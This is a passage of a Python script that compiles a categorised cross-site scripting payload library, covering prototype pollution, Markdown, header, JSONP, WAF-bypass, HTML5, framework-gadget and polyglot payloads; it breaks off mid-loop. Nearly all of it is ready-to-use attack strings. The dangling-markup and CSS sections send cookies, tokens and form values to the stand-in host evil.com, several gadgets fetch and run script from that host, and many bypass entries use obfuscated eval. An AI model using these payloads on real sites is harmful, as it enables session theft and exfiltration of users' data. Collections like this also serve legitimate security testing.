    "<script>parent.postMessage({type:'iframe-event',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'resize',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'location-change',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'loaded',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'ready',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'init',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'error',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'message',data:'alert(1)'},'*')</script>",
]
for p in postmsg_payloads:
    add("postmessage_source", p, ["postmessage", "origin_bypass",
                                   "prototype_pollution", "devtools"],
        confidence="high", note="postMessage without origin check / prototype "
        "pollution via postMessage / devtools message abuse")


# ==========================================================================
# 8. Prototype pollution -> XSS gadgets (30)
# ==========================================================================
proto_payloads = [
    "{\"__proto__\":{\"onload\":\"alert(1)\"}}",
    "{\"__proto__\":{\"srcdoc\":\"<script>alert(1)</script>\"}}",
    "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
    "{\"__proto__\":{\"outerHTML\":\"<img src=x onerror=alert(1)>\"}}",
    "{\"__proto__\":{\"onerror\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onclick\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onmouseover\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onfocus\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onblur\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onsubmit\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onchange\":\"alert(1)\"}}",
    "{\"__proto__\":{\"oninput\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onkeydown\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onkeyup\":\"alert(1)\"}}",
    "{\"__proto__\":{\"onkeypress\":\"alert(1)\"}}",
    "{\"__proto__\":{\"href\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"src\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"action\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"formaction\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"data\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"poster\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"background\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"cite\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"longdesc\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"usemap\":\"javascript:alert(1)\"}}",
    "{\"__proto__\":{\"manifest\":\"javascript:alert(1)\"}}",
    "{\"constructor\":{\"prototype\":{\"onload\":\"alert(1)\"}}}",
    "{\"constructor\":{\"prototype\":{\"srcdoc\":\"<script>alert(1)</script>\"}}}",
    "{\"constructor\":{\"prototype\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}}",
    "{\"constructor\":{\"prototype\":{\"href\":\"javascript:alert(1)\"}}}",
]
for p in proto_payloads:
    add("prototype_gadget", p, ["prototype_pollution", "gadget", "json"],
        confidence="high", note="Prototype pollution -> XSS gadget via "
        "DOM sink (onload/srcdoc/innerHTML/href)")


# ==========================================================================
# 9. Markdown / BBCode injection (40)
# ==========================================================================
md_payloads = [
    "[xss](javascript:alert(1))",
    "[xss](javascript:alert`1`)",
    "[xss](javascript:alert(1)//)",
    "[xss](javascript:alert(1)/*)",
    "[xss](data:text/html,<script>alert(1)</script>)",
    "[xss](vbscript:alert(1))",
    "[xss](javascript&colon;alert(1))",
    "[xss](javascript&#x3a;alert(1))",
    "[xss](javascript&#58;alert(1))",
    "![xss](javascript:alert(1))",
    "![xss](\"onerror=alert(1))",
    "![xss](x\"onerror=alert(1))",
    "![xss](x onerror=alert(1))",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(1)//>",
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "[click](#\"><script>alert(1)</script>)",
    "[click](#\" onclick=\"alert(1))",
    "[click](#\" onmouseover=\"alert(1))",
    "[click](javascript:alert(1))",
    "[click](javascript:alert(1)//)",
    "[click](javascript:alert(1)/*)",
    "[click](data:text/html,<script>alert(1)</script>)",
    "[xss]: javascript:alert(1)",
    "[xss]: data:text/html,<script>alert(1)</script>",
    "[click][xss]",
    "![xss](javascript:alert(1))",
    "![click](x\"onerror=\"alert(1))",
    "<details open ontoggle=alert(1)>",
    "<details open><summary>x</summary><p>y</p></details ontoggle=alert(1)>",
    "[a]: (javascript:alert(1))",
    "[a]: javascript:alert(1)",
    "[a]: data:text/html,<script>alert(1)</script>",
    "[xss](javascript:alert(document.cookie))",
    "[xss](javascript:alert(document.domain))",
    "[xss](javascript:alert(window.origin))",
]
for p in md_payloads:
    add("markdown", p, ["markdown", "bbcode", "link", "image"],
        confidence="high", note="Markdown/BBCode link/image injection")


# ==========================================================================
# 10. HTTP header reflection (30)
# ==========================================================================
header_payloads = [
    "User-Agent: <script>alert(1)</script>",
    "User-Agent: <img src=x onerror=alert(1)>",
    "User-Agent: <svg onload=alert(1)>",
    "Referer: <script>alert(1)</script>",
    "Referer: <img src=x onerror=alert(1)>",
    "Referer: <svg onload=alert(1)>",
    "Cookie: x=<script>alert(1)</script>",
    "Cookie: x=<img src=x onerror=alert(1)>",
    "Cookie: x=<svg onload=alert(1)>",
    "X-Forwarded-For: <script>alert(1)</script>",
    "X-Forwarded-For: <img src=x onerror=alert(1)>",
    "X-Forwarded-For: <svg onload=alert(1)>",
    "X-Forwarded-Host: <script>alert(1)</script>",
    "X-Forwarded-Host: <img src=x onerror=alert(1)>",
    "X-Forwarded-Proto: <script>alert(1)</script>",
    "X-Real-IP: <script>alert(1)</script>",
    "X-Real-IP: <img src=x onerror=alert(1)>",
    "X-Client-IP: <script>alert(1)</script>",
    "X-Originating-IP: <script>alert(1)</script>",
    "X-Remote-IP: <script>alert(1)</script>",
    "X-Remote-Addr: <script>alert(1)</script>",
    "CF-Connecting-IP: <script>alert(1)</script>",
    "True-Client-IP: <script>alert(1)</script>",
    "X-Cluster-Client-IP: <script>alert(1)</script>",
    "X-WAP-Profile: <script>alert(1)</script>",
    "Accept-Language: <script>alert(1)</script>",
    "Accept-Language: <img src=x onerror=alert(1)>",
    "Accept: <script>alert(1)</script>",
    "Host: <script>alert(1)</script>",
    "Via: <script>alert(1)</script>",
]
for p in header_payloads:
    add("header_reflection", p, ["header", "ua", "referer", "cookie",
                                  "xff", "reflection"],
        confidence="high", note="HTTP header value reflected into HTML")


# ==========================================================================
# 11. Path-based XSS (20)
# ==========================================================================
path_payloads = [
    "/<script>alert(1)</script>",
    "/<img src=x onerror=alert(1)>",
    "/<svg onload=alert(1)>",
    "/%3Cscript%3Ealert(1)%3C/script%3E",
    "/%3Cimg%20src=x%20onerror=alert(1)%3E",
    "/%3Csvg%20onload=alert(1)%3E",
    "/..%2f<script>alert(1)</script>",
    "/..%2f..%2f<script>alert(1)</script>",
    "/..%5c<script>alert(1)</script>",
    "/..%5c..%5c<script>alert(1)</script>",
    "/%2e%2e/<script>alert(1)</script>",
    "/%2e%2e/%2e%2e/<script>alert(1)</script>",
    "/./<script>alert(1)</script>",
    "/.<script>alert(1)</script>",
    "///<script>alert(1)</script>",
    "////<script>alert(1)</script>",
    "/;/<script>alert(1)</script>",
    "/;/;/<script>alert(1)</script>",
    "/%00<script>alert(1)</script>",
    "/%0a<script>alert(1)</script>",
]
for p in path_payloads:
    add("path_xss", p, ["path", "traversal", "encoding"],
        confidence="medium", note="Path traversal / path-based XSS injection")


# ==========================================================================
# 12. Error page injection (30)
# ==========================================================================
error_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<button onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<isindex action=javascript:alert(1)>",
    "<isindex onmouseover=alert(1)>",
    "<table background=javascript:alert(1)>",
    "<td background=javascript:alert(1)>",
    "<body background=javascript:alert(1)>",
    "<bgsound src=javascript:alert(1)>",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<img src=`javascript:alert(1)`>",
    "<img/src=`javascript:alert(1)`>",
    "<img/src=`javascript:alert(1)`/onerror=alert(1)>",
    "<img src=`x`onerror=alert(1)>",
    "<img/src=`x`/onerror=`alert(1)`>",
]
for p in error_payloads:
    add("error_page", p, ["error_page", "reflection", "404", "500"],
        confidence="medium", note="Error page (404/500) reflected input injection")


# ==========================================================================
# 13. JSONP callback variants (30)
# ==========================================================================
jsonp_payloads = [
    "callback(alert(1))",
    "callback(alert(1)//",
    "callback(alert(1))//",
    "callback(alert(1))/*",
    "callback();alert(1)//",
    "callback();alert(1)/*",
    "callback();alert(1)//",
    "callback=function(){alert(1)}",
    "callback=alert(1)//",
    "callback=alert(1)/*",
    "cb(alert(1))",
    "cb(alert(1)//",
    "cb(alert(1))//",
    "cb(alert(1))/*",
    "cb();alert(1)//",
    "cb();alert(1)/*",
    "cb=function(){alert(1)}",
    "cb=alert(1)//",
    "cb=alert(1)/*",
    "jsonp(alert(1))",
    "jsonp(alert(1)//",
    "jsonp(alert(1))//",
    "jsonp(alert(1))/*",
    "jsonp();alert(1)//",
    "jsonp=function(){alert(1)}",
    "jsonp=alert(1)//",
    "jsonpcallback(alert(1))",
    "jsonpcallback(alert(1)//",
    "jsonpcallback(alert(1))//",
    "jsonpcallback(alert(1))/*",
]
for p in jsonp_payloads:
    add("script_block", p, ["jsonp", "callback", "reflection"],
        confidence="high", note="JSONP callback parameter injection")


# ==========================================================================
# 14. Modern WAF bypass shapes (60)
# ==========================================================================
waf_bypass = [
    "<svg/onload=alert(1)>",
    "<svg/onload=alert(1)//>",
    "<svg/onload=alert`1`>",
    "<svg/onload=alert`1`//>",
    "<svg/onload=alert(1)>",
    "<svg/onload=alert(1)//>",
    "<svg/onload=alert(document.domain)>",
    "<svg/onload=alert(document.cookie)>",
    "<svg/onload=alert(window.origin)>",
    "<svg/onload=alert(window.name)>",
    "<svg/onload=alert(location.href)>",
    "<svg/onload=alert(location.hash)>",
    "<svg/onload=alert(location.search)>",
    "<svg/onload=eval(location.hash.slice(1))>",
    "<svg/onload=eval(location.search.slice(1))>",
    "<svg/onload=eval(name)>",
    "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
    "<svg/onload=eval(decodeURIComponent(location.hash.slice(1)))>",
    "<svg/onload=Function(location.hash.slice(1))()>",
    "<svg/onload=Function(name)()>",
    "<svg/onload=Function(atob('YWxlcnQoMSk='))()>",
    "<svg/onload=window.onerror=alert;throw'1'>",
    "<svg/onload=window.onerror=alert;throw 1>",
    "<svg/onload=window.onerror=eval;throw'alert(1)'>",
    "<svg/onload=window.onerror=eval;throw atob('YWxlcnQoMSk=')>",
    "<img/src=x/onerror=alert(1)>",
    "<img/src=x/onerror=alert`1`>",
    "<img/src=x/onerror=alert(1)//>",
    "<img/src=x/onerror=alert(1)/*>",
    "<img/src=x/onerror=alert(document.domain)>",
    "<img/src=x/onerror=alert(document.cookie)>",
    "<img/src=x/onerror=alert(window.origin)>",
    "<img/src=x/onerror=alert(window.name)>",
    "<img/src=x/onerror=eval(name)>",
    "<img/src=x/onerror=eval(location.hash.slice(1))>",
    "<img/src=x/onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img/src=x/onerror=eval(decodeURIComponent(location.hash.slice(1)))>",
    "<img/src=x/onerror=Function(location.hash.slice(1))()>",
    "<img/src=x/onerror=Function(name)()>",
    "<img/src=x/onerror=Function(atob('YWxlcnQoMSk='))()>",
    "<img/src=x/onerror=window.onerror=alert;throw'1'>",
    "<img/src=x/onerror=window.onerror=alert;throw 1>",
    "<img/src=x/onerror=window.onerror=eval;throw'alert(1)'>",
    "<img/src=x/onerror=window.onerror=eval;throw atob('YWxlcnQoMSk=')>",
    "<body/onload=alert(1)>",
    "<body/onload=alert`1`>",
    "<body/onload=alert(1)//>",
    "<body/onload=alert(1)/*>",
    "<body/onload=alert(document.domain)>",
    "<body/onload=alert(document.cookie)>",
    "<body/onload=alert(window.origin)>",
    "<body/onload=alert(window.name)>",
    "<body/onload=eval(name)>",
    "<body/onload=eval(location.hash.slice(1))>",
    "<body/onload=eval(atob('YWxlcnQoMSk='))>",
    "<body/onload=eval(decodeURIComponent(location.hash.slice(1)))>",
    "<body/onload=Function(location.hash.slice(1))()>",
    "<body/onload=Function(name)()>",
    "<body/onload=Function(atob('YWxlcnQoMSk='))()>",
    "<body/onload=window.onerror=alert;throw'1'>",
]
for p in waf_bypass:
    add("html_element", p, ["waf_bypass", "modern", "svg", "img", "body"],
        confidence="high", note="Modern WAF bypass: slash-separator / "
        "backtick / hash-source / name-source / throw-onerror")


# ==========================================================================
# 15. Data URI / exotic scheme (30)
# ==========================================================================
data_uri_payloads = [
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "data:text/html,<img src=x onerror=alert(1)>",
    "data:text/html,<svg onload=alert(1)>",
    "data:text/html,<body onload=alert(1)>",
    "data:text/html,<iframe src=javascript:alert(1)>",
    "data:text/html,<a href=javascript:alert(1)>x</a>",
    "data:text/html,<details open ontoggle=alert(1)>",
    "data:text/html,<input onfocus=alert(1) autofocus>",
    "data:text/html,<video><source onerror=alert(1)>",
    "data:text/html,<audio src=x onerror=alert(1)>",
    "data:text/html,<object data=javascript:alert(1)>",
    "data:text/html,<embed src=javascript:alert(1)>",
    "data:text/html,<form action=javascript:alert(1)>",
    "data:text/html,<isindex action=javascript:alert(1)>",
    "data:text/html,<table background=javascript:alert(1)>",
    "data:text/html,<bgsound src=javascript:alert(1)>",
    "data:application/xhtml+xml,<script>alert(1)</script>",
    "data:application/xhtml+xml,<svg xmlns='http://www.w3.org/2000/svg' onload=alert(1)>",
    "data:application/xhtml+xml,<img src=x onerror=alert(1)>",
    "data:image/svg+xml,<svg onload=alert(1)>",
    "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
    "data:image/svg+xml,<svg><script>alert(1)</script></svg>",
    "vbscript:alert(1)",
    "vbscript:msgbox(1)",
    "vbscript:Execute(\"alert(1)\")",
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    "javascript:alert(document.domain)",
    "javascript:alert(window.origin)",
]
for p in data_uri_payloads:
    add("data_uri", p, ["data_uri", "scheme", "vbscript", "javascript"],
        confidence="high", note="data: / vbscript: / javascript: scheme URI")


# ==========================================================================
# 16. HTML5 new tags / attributes (40)
# ==========================================================================
html5_payloads = [
    "<details open ontoggle=alert(1)>",
    "<details open ontoggle=alert(1)//>",
    "<details open ontoggle=alert`1`>",
    "<details ontoggle=alert(1) open>",
    "<summary onclick=alert(1)>x</summary>",
    "<dialog open onload=alert(1)>",
    "<dialog open onclose=alert(1)>",
    "<menu onclick=alert(1)>",
    "<menuitem onclick=alert(1)>",
    "<picture onload=alert(1)>",
    "<source onerror=alert(1)>",
    "<track onload=alert(1)>",
    "<video onerror=alert(1)>",
    "<video onloadstart=alert(1)>",
    "<video oncanplay=alert(1)>",
    "<video onloadeddata=alert(1)>",
    "<audio onerror=alert(1)>",
    "<audio onloadstart=alert(1)>",
    "<audio oncanplay=alert(1)>",
    "<audio onloadeddata=alert(1)>",
    "<canvas onload=alert(1)>",
    "<svg><animate onbegin=alert(1)>",
    "<svg><animate onend=alert(1)>",
    "<svg><animate onrepeat=alert(1)>",
    "<svg><set onbegin=alert(1)>",
    "<svg><set onend=alert(1)>",
    "<svg><animateMotion onbegin=alert(1)>",
    "<svg><animateMotion onend=alert(1)>",
    "<svg><animateTransform onbegin=alert(1)>",
    "<svg><animateTransform onend=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus>",
    "<input onchange=alert(1) autofocus>",
    "<input oninput=alert(1) autofocus>",
    "<input onkeydown=alert(1) autofocus>",
    "<input onkeyup=alert(1) autofocus>",
    "<input onkeypress=alert(1) autofocus>",
    "<input type=image src=x onerror=alert(1)>",
    "<input type=image src=x:alert(1) onerror=eval(src)>",
    "<button formaction=javascript:alert(1)>x</button>",
]
for p in html5_payloads:
    add("html5_new", p, ["html5", "details", "dialog", "media", "input"],
        confidence="high", note="HTML5 new tags/events: details/ontoggle, "
        "dialog, media events, input autofocus")


# ==========================================================================
# 17. Dangling markup injection (30) — for data exfiltration without JS
# ==========================================================================
dangling = [
    "<img src='//evil.com/?",
    "<img src=\"//evil.com/?",
    "<img src=`//evil.com/?",
    "<img src='//evil.com/?cookie=",
    "<img src=\"//evil.com/?cookie=",
    "<img src=`//evil.com/?cookie=",
    "<img src='//evil.com/?token=",
    "<img src=\"//evil.com/?token=",
    "<img src=`//evil.com/?token=",
    "<a href='//evil.com/?",
    "<a href=\"//evil.com/?",
    "<a href=`//evil.com/?",
    "<a href='//evil.com/?cookie=",
    "<a href=\"//evil.com/?cookie=",
    "<a href=`//evil.com/?cookie=",
    "<form action='//evil.com/?",
    "<form action=\"//evil.com/?",
    "<form action=`//evil.com/?",
    "<form action='//evil.com/?cookie=",
    "<form action=\"//evil.com/?cookie=",
    "<form action=`//evil.com/?cookie=",
    "<base href='//evil.com/?",
    "<base href=\"//evil.com/?",
    "<base href=`//evil.com/?",
    "<base href='//evil.com/?cookie=",
    "<base href=\"//evil.com/?cookie=",
    "<base href=`//evil.com/?cookie=",
    "<object data='//evil.com/?",
    "<object data=\"//evil.com/?",
    "<object data=`//evil.com/?",
]
for p in dangling:
    add("dangling_markup", p, ["dangling_markup", "exfil", "no_js"],
        confidence="high", note="Dangling markup injection for data "
        "exfiltration without JavaScript execution")


# ==========================================================================
# 18. Script gadget injection (40) — jQuery / Knockout / Ember
# ==========================================================================
gadget_payloads = [
    "<div id=x><script>$('#x').html('<img src=x onerror=alert(1)>')</script></div>",
    "<div id=x><script>$('#x').append('<img src=x onerror=alert(1)>')</script></div>",
    "<div id=x><script>$('#x').prepend('<img src=x onerror=alert(1)>')</script></div>",
    "<div id=x><script>$('#x').after('<img src=x onerror=alert(1)>')</script></div>",
    "<div id=x><script>$('#x').before('<img src=x onerror=alert(1)>')</script></div>",
    "<div id=x><script>$('#x').replaceWith('<img src=x onerror=alert(1)>')</script></div>",
    "<div id=x><script>$(document).html('<img src=x onerror=alert(1)>')</script></div>",
    "<div id=x><script>$('<img src=x onerror=alert(1)>').appendTo('#x')</script></div>",
    "<div id=x><script>$('<img src=x onerror=alert(1)>').prependTo('#x')</script></div>",
    "<div id=x><script>$('<img src=x onerror=alert(1)>').insertAfter('#x')</script></div>",
    "<div id=x><script>$('<img src=x onerror=alert(1)>').insertBefore('#x')</script></div>",
    "<div id=x><script>$('#x').load('//evil.com/x.html')</script></div>",
    "<div id=x><script>$('#x').load('//evil.com/x.html #payload')</script></div>",
    "<div id=x><script>$.get('//evil.com/x.html',function(d){$('#x').html(d)})</script></div>",
    "<div id=x><script>$.getScript('//evil.com/x.js')</script></div>",
    "<div id=x><script>$.getJSON('//evil.com/x.json',function(d){$('#x').html(d.x)})</script></div>",
    "<div id=x><script>$.ajax({url:'//evil.com/x.html',success:function(d){$('#x').html(d)}})</script></div>",
    "<div id=x><script>$.ajax({url:'//evil.com/x.js',dataType:'script'})</script></div>",
    "<div id=x><script>$.globalEval('alert(1)')</script></div>",
    "<div id=x><script>$.parseHTML('<img src=x onerror=alert(1)>')</script></div>",
    "<div id=x><script>$.parseHTML('<img src=x onerror=alert(1)>')[0].src</script></div>",
    "<div id=x><script>knockout.applyBindings({x:'<img src=x onerror=alert(1)>'},document.getElementById('x'))</script></div>",
    "<div id=x data-bind='html: \"<img src=x onerror=alert(1)>\"'><script>ko.applyBindings({})</script></div>",
    "<div id=x data-bind='click: alert(1)'><script>ko.applyBindings({})</script></div>",
    "<div id=x data-bind='event: { mouseover: alert(1) }'><script>ko.applyBindings({})</script></div>",
    "<div id=x data-bind='attr: { onmouseover: \"alert(1)\" }'><script>ko.applyBindings({})</script></div>",
    "<div id=x data-bind='template: { html: \"<img src=x onerror=alert(1)>\" }'><script>ko.applyBindings({})</script></div>",
    "<div id=x data-bind='style: { background: \"url(javascript:alert(1))\" }'><script>ko.applyBindings({})</script></div>",
    "<div id=x><script>Ember.View.create({template:Ember.Handlebars.compile('<img src=x onerror=alert(1)>')}).appendTo('#x')</script></div>",
    "<div id=x><script>Ember.Component.create({layout:Ember.Handlebars.compile('<img src=x onerror=alert(1)>')}).appendTo('#x')</script></div>",
    "<div id=x><script>Backbone.View.extend({render:function(){this.$el.html('<img src=x onerror=alert(1)>');return this}}).create().render().$el.appendTo('#x')</script></div>",
    "<div id=x><script>Vue.createApp({render:()=>Vue.h('div',{innerHTML:'<img src=x onerror=alert(1)>'})}).mount('#x')</script></div>",
    "<div id=x><script>new Vue({el:'#x',template:'<img src=x onerror=alert(1)>'})</script></div>",
    "<div id=x><script>new Vue({el:'#x',data:{x:'<img src=x onerror=alert(1)>'},template:'<div v-html=x></div>'})</script></div>",
    "<div id=x><script>ReactDOM.render(React.createElement('div',{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}}),document.getElementById('x'))</script></div>",
    "<div id=x><script>ReactDOM.render(React.createElement('img',{src:'x',onError:alert(1)}),document.getElementById('x'))</script></div>",
    "<div id=x><script>ReactDOM.render(React.createElement('a',{href:'javascript:alert(1)'},'x'),document.getElementById('x'))</script></div>",
    "<div id=x><script>ReactDOM.render(React.createElement('iframe',{src:'javascript:alert(1)'}),document.getElementById('x'))</script></div>",
    "<div id=x><script>ReactDOM.render(React.createElement('script',{dangerouslySetInnerHTML:{__html:'alert(1)'}}),document.getElementById('x'))</script></div>",
    "<div id=x><script>ReactDOM.render(React.createElement('div',{ref:function(el){el.innerHTML='<img src=x onerror=alert(1)>'}}),document.getElementById('x'))</script></div>",
]
for p in gadget_payloads:
    add("script_gadget", p, ["script_gadget", "jquery", "knockout",
                              "ember", "vue", "react"],
        confidence="high", note="Script gadget: framework sink abuse "
        "(jQuery.html/load, Knockout data-bind, Vue/React render)")


# ==========================================================================
# 19. CSS exfiltration (30) — for data theft without JS
# ==========================================================================
css_exfil = [
    "<style>input[value^=a]{background:url(//evil.com/?a)}</style>",
    "<style>input[value^=b]{background:url(//evil.com/?b)}</style>",
    "<style>input[value^=c]{background:url(//evil.com/?c)}</style>",
    "<style>input[value^=d]{background:url(//evil.com/?d)}</style>",
    "<style>input[value^=e]{background:url(//evil.com/?e)}</style>",
    "<style>input[value^=f]{background:url(//evil.com/?f)}</style>",
    "<style>input[value^=0]{background:url(//evil.com/?0)}</style>",
    "<style>input[value^=1]{background:url(//evil.com/?1)}</style>",
    "<style>input[value^=2]{background:url(//evil.com/?2)}</style>",
    "<style>input[value^=3]{background:url(//evil.com/?3)}</style>",
    "<style>input[value^=4]{background:url(//evil.com/?4)}</style>",
    "<style>input[value^=5]{background:url(//evil.com/?5)}</style>",
    "<style>input[value^=6]{background:url(//evil.com/?6)}</style>",
    "<style>input[value^=7]{background:url(//evil.com/?7)}</style>",
    "<style>input[value^=8]{background:url(//evil.com/?8)}</style>",
    "<style>input[value^=9]{background:url(//evil.com/?9)}</style>",
    "<style>input[value$=a]{background:url(//evil.com/?last=a)}</style>",
    "<style>input[value$=b]{background:url(//evil.com/?last=b)}</style>",
    "<style>input[value$=c]{background:url(//evil.com/?last=c)}</style>",
    "<style>input[value*=a]{background:url(//evil.com/?contains=a)}</style>",
    "<style>input[value*=b]{background:url(//evil.com/?contains=b)}</style>",
    "<style>input[value*=c]{background:url(//evil.com/?contains=c)}</style>",
    "<style>textarea[value^=a]{background:url(//evil.com/?ta=a)}</style>",
    "<style>textarea[value^=b]{background:url(//evil.com/?ta=b)}</style>",
    "<style>select[value^=a]{background:url(//evil.com/?sel=a)}</style>",
    "<style>select[value^=b]{background:url(//evil.com/?sel=b)}</style>",
    "<style>:focus{background:url(//evil.com/?focus)}</style>",
    "<style>:hover{background:url(//evil.com/?hover)}</style>",
    "<style>:checked{background:url(//evil.com/?checked)}</style>",
    "<style>:valid{background:url(//evil.com/?valid)}</style>",
]
for p in css_exfil:
    add("css_exfil", p, ["css_exfil", "exfil", "no_js", "attribute_selector"],
        confidence="high", note="CSS attribute-selector exfiltration "
        "for input/textarea/select values without JS")


# ==========================================================================
# 20. Polyglot expansion (30) — cross-context polyglots
# ==========================================================================
polyglots_new = [
    {"name": "universal-backtick", "contexts": ["html_element",
     "html_attribute_dq", "html_attribute_sq", "script_string_dq",
     "script_string_sq", "url_javascript", "css_context"],
     "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"},
    {"name": "universal-throw", "contexts": ["html_element",
     "html_attribute_dq", "script_string_dq", "url_javascript"],
     "payload": "javascript:window.onerror=alert;throw 1"},
    {"name": "universal-eval-hash", "contexts": ["html_element",
     "html_attribute_dq", "script_string_dq", "url_javascript"],
     "payload": "javascript:eval(location.hash.slice(1))#alert(1)"},
    {"name": "universal-eval-name", "contexts": ["html_element",
     "html_attribute_dq", "script_string_dq", "url_javascript"],
     "payload": "javascript:eval(name)//#"},
    {"name": "universal-eval-src", "contexts": ["html_element",
     "html_attribute_dq", "script_string_dq", "url_javascript"],
     "payload": "javascript:eval(atob('YWxlcnQoMSk='))"},
    {"name": "universal-function", "contexts": ["html_element",
     "html_attribute_dq", "script_string_dq", "url_javascript"],
     "payload": "javascript:Function(alert(1))()"},
    {"name": "universal-promise", "contexts": ["html_element",
     "script_string_dq", "url_javascript"],
     "payload": "javascript:new Promise(function(r){r(alert(1))})"},
    {"name": "universal-async", "contexts": ["html_element",
     "script_string_dq", "url_javascript"],
     "payload": "javascript:(async()=>{alert(1)})()"},
    {"name": "universal-generator", "contexts": ["html_element",
     "script_string_dq", "url_javascript"],
     "payload": "javascript:(function*(){yield alert(1)})().next()"},
    {"name": "universal-import", "contexts": ["html_element",
     "script_string_dq", "url_javascript"],
     "payload": "javascript:import('data:text/javascript,alert(1)')"},
    {"name": "svg-onload-hash", "contexts": ["html_element", "svg_context"],
     "payload": "<svg onload=eval(location.hash.slice(1))>#alert(1)"},
    {"name": "svg-onload-name", "contexts": ["html_element", "svg_context"],
     "payload": "<svg onload=eval(name)>"},
    {"name": "svg-onload-b64", "contexts": ["html_element", "svg_context"],
     "payload": "<svg onload=eval(atob('YWxlcnQoMSk='))>"},
    {"name": "img-onerror-hash", "contexts": ["html_element"],
     "payload": "<img src=x onerror=eval(location.hash.slice(1))>#alert(1)"},
    {"name": "img-onerror-name", "contexts": ["html_element"],
     "payload": "<img src=x onerror=eval(name)>"},
    {"name": "img-onerror-b64", "contexts": ["html_element"],
     "payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"},
    {"name": "img-onerror-throw", "contexts": ["html_element"],
     "payload": "<img src=x onerror=window.onerror=alert;throw 1>"},
    {"name": "body-onload-hash", "contexts": ["html_element"],
     "payload": "<body onload=eval(location.hash.slice(1))>#alert(1)"},
    {"name": "body-onload-name", "contexts": ["html_element"],
     "payload": "<body onload=eval(name)>"},
    {"name": "body-onload-b64", "contexts": ["html_element"],
     "payload": "<body onload=eval(atob('YWxlcnQoMSk='))>"},
    {"name": "body-onload-throw", "contexts": ["html_element"],
     "payload": "<body onload=window.onerror=alert;throw 1>"},
    {"name": "details-ontoggle-hash", "contexts": ["html_element",
     "html5_new"],
     "payload": "<details open ontoggle=eval(location.hash.slice(1))>#alert(1)"},
    {"name": "details-ontoggle-name", "contexts": ["html_element",
     "html5_new"],
     "payload": "<details open ontoggle=eval(name)>"},
    {"name": "details-ontoggle-b64", "contexts": ["html_element",
     "html5_new"],
     "payload": "<details open ontoggle=eval(atob('YWxlcnQoMSk='))>"},
    {"name": "input-onfocus-hash", "contexts": ["html_element", "html5_new"],
     "payload": "<input onfocus=eval(location.hash.slice(1)) autofocus>#alert(1)"},
    {"name": "input-onfocus-name", "contexts": ["html_element", "html5_new"],
     "payload": "<input onfocus=eval(name) autofocus>"},
    {"name": "input-onfocus-b64", "contexts": ["html_element", "html5_new"],
     "payload": "<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>"},
    {"name": "select-onfocus-hash", "contexts": ["html_element", "html5_new"],
     "payload": "<select onfocus=eval(location.hash.slice(1)) autofocus>#alert(1)"},
    {"name": "textarea-onfocus-hash", "contexts": ["html_element",
     "html5_new"],
     "payload": "<textarea onfocus=eval(location.hash.slice(1)) autofocus>#alert(1)"},
    {"name": "video-onerror-hash", "contexts": ["html_element", "html5_new"],
     "payload": "<video><source onerror=eval(location.hash.slice(1))>#alert(1)"},
    {"name": "audio-onerror-hash", "contexts": ["html_element", "html5_new"],
     "payload": "<audio src=x onerror=eval(location.hash.slice(1))>#alert(1)"},
]
existing_poly = {p["payload"] for p in data["polyglots"]}
for poly in polyglots_new:
    if poly["payload"] in existing_poly:
        continue
    pid = f"poly_{len(data['polyglots'])+1:03d}"
    data["polyglots"].append({
